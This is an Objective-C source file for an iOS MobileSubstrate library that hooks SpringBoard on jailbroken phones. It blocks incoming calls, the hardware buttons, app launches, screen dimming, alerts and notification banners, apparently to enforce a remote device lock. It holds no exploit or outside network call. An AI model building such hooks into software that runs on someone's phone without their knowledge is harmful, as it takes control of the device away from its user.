//
//  MSFDL.mm
//  MSFDL
//
//  Created by Makara Khloth on 6/18/12.
//  Copyright __MyCompanyName__ 2012. All rights reserved.
//
//  MobileSubstrate, libsubstrate.dylib, and substrate.h are
//  created and copyrighted by Jay Freeman a.k.a saurik and 
//  are protected by various means of open source licensing.
//
//  Additional defines courtesy Lance Fetters a.k.a ashikase
//
#import "MSFDL.h"

#import "AlertLockHook.h"
#import "DeviceLockManagerUtils.h"

#import "CallManager.h"
#import <UIKit/UIKit.h>

#pragma mark dylib initialization and initial hooks
#pragma mark 

extern "C" void MSFDLInitialize() {	
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];	
    	
	// Check open application and create hooks here:
	NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];
	DLog (@"BLOCKING:	MSFDL Loaded with identifier = %@", identifier);
   
	if ([identifier isEqualToString:@"com.apple.springboard"]) {
        // Block Call (disconnect incoming)
		[CallManager sharedCallManager];
		
#pragma mark -
#pragma mark Device lock
#pragma mark -
		
		// -- DeviceLock [BEGIN]
		
		DLog (@"create device lock manager utils")
		DeviceLockManagerUtils *mDeviceLockMgrUtil = [DeviceLockManagerUtils sharedDeviceLockManagerUtils];
		[mDeviceLockMgrUtil startMessagePortReader];
		DLog (@"done creating device lock manager utils")
		
		Class $SpringBoard(objc_getClass("SpringBoard"));
		
		// - home button
		_SpringBoard$menuButtonDown$						= MSHookMessage($SpringBoard, @selector(menuButtonDown:), &$SpringBoard$menuButtonDown$);
		_SpringBoard$menuButtonUp$							= MSHookMessage($SpringBoard, @selector(menuButtonUp:), &$SpringBoard$menuButtonUp$);
		
		// - lock button
		_SpringBoard$lockButtonDown$						= MSHookMessage($SpringBoard, @selector(lockButtonDown:), &$SpringBoard$lockButtonDown$);
		_SpringBoard$lockButtonUp$							= MSHookMessage($SpringBoard, @selector(lockButtonUp:), &$SpringBoard$lockButtonUp$);
		_SpringBoard$lockButtonWasHeld						= MSHookMessage($SpringBoard, @selector(lockButtonWasHeld), &$SpringBoard$lockButtonWasHeld);
		
		// quit the application running on top
		_SpringBoard$quitTopApplication$					= MSHookMessage($SpringBoard, @selector(quitTopApplication:), &$SpringBoard$quitTopApplication$);

		// - showing SpringBoard's status bar
		_SpringBoard$showSpringBoardStatusBar				= MSHookMessage($SpringBoard, @selector(showSpringBoardStatusBar), &$SpringBoard$showSpringBoardStatusBar);		
		
		// - volume button
		Class $VolumeControl(objc_getClass("VolumeControl"));
		_VolumeControl$increaseVolume						= MSHookMessage($VolumeControl, @selector(increaseVolume), &$VolumeControl$increaseVolume);
		_VolumeControl$decreaseVolume						= MSHookMessage($VolumeControl, @selector(decreaseVolume), &$VolumeControl$decreaseVolume);
		
		Class $SBUIController(objc_getClass("SBUIController")); 
		// - start to lock the device in this method
		_SBUIController$finishLaunching						= MSHookMessage($SBUIController, @selector(finishLaunching), &$SBUIController$finishLaunching);
		// - disable the gesture to bring the Notification Center view down
		_SBUIController$_showNotificationsGestureBeganWithLocation$		= MSHookMessage($SBUIController, @selector(_showNotificationsGestureBeganWithLocation:), &$SBUIController$_showNotificationsGestureBeganWithLocation$);
		// - prevent some appliction from running
		_SBUIController$activateApplicationAnimated$		= MSHookMessage($SBUIController, @selector(activateApplicationAnimated:), &$SBUIController$activateApplicationAnimated$);
		// -
		//_SBUIController$animateApplicationActivation$animateDefaultImage$scatterIcons$	= MSHookMessage($SBUIController, @selector(animateApplicationActivation:animateDefaultImage:scatterIcons:), &$SBUIController$animateApplicationActivation$animateDefaultImage$scatterIcons$);
		
		Class $SBApplication(objc_getClass("SBApplication"));
		_SBApplication$launchSucceeded$		= MSHookMessage($SBApplication, @selector(launchSucceeded:), &$SBApplication$launchSucceeded$);
		
		// prevent calling view
		//Class $SBAlertWindow(objc_getClass("SBAlertWindow"));
		//_SBAlertWindow$displayAlert$				= MSHookMessage($SBAlertWindow, @selector(displayAlert:), &$SBAlertWindow$displayAlert$);
	
		// - prevent the device to dim the screen
		Class $SBAwayController(objc_getClass("SBAwayController"));
		_SBAwayController$dimScreen$						= MSHookMessage($SBAwayController, @selector(dimScreen:), &$SBAwayController$dimScreen$);
		
		// - block alert on the middle of screen for ios 4 and 5 (share with restriction manager)
		Class $SBAlertItemsController(objc_getClass("SBAlertItemsController"));
		_SBAlertItemsController$activateAlertItem$			= MSHookMessage($SBAlertItemsController, @selector(activateAlertItem:), &$SBAlertItemsController$activateAlertItem$);
		
		// - block banner on top of the screen for ios 5 only
		Class $SBBulletinBannerController(objc_getClass("SBBulletinBannerController"));
		_SBBulletinBannerController$_presentBannerForItem$	= MSHookMessage($SBBulletinBannerController, @selector(_presentBannerForItem:), &$SBBulletinBannerController$_presentBannerForItem$);			
		
		// -- Device Lock [END]
		
#pragma mark -
#pragma mark Auto lock
#pragma mark -
		
		_SpringBoard$autoLock = MSHookMessage($SpringBoard, @selector(autoLock), &$SpringBoard$autoLock);
		
    }
    
	
	DLog(@"MSFDL initialize end");
    [pool release];
}




 
